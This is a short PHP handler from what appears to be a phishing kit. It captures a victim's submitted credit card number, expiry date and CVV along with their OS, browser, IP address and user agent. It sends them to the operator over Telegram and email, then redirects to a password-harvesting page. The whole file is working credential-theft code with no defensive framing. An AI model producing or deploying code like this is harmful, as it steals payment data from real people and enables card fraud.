<?php

/*

Author : DIB
Email : b41tsm@gmail.com
ICQ : @MorrisWorm

*/

if(isset($_POST['ccFormatMonitor']) && isset($_POST['inputExpDate']) && isset($_POST['cvv'])){
	
include "../config.php";
include "funcs.php";

$ccn =  $_POST['ccFormatMonitor'];
$cce =  $_POST['inputExpDate'];
$cvv =  $_POST['cvv'];

$message = "\n💳CC : $ccn\n💳EXP : $cce\n💳CCV : $cvv\n🕹️OS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\n🕹️Browser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\n🕹️IP : $ip\n🕹️Agent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);

$subject = " 💳 CC INFO  $ip";


mail($to,$subject,$message );


echo "<meta http-equiv=\"Refresh\" content=\"0; url=../pass.php\" />";



}
?>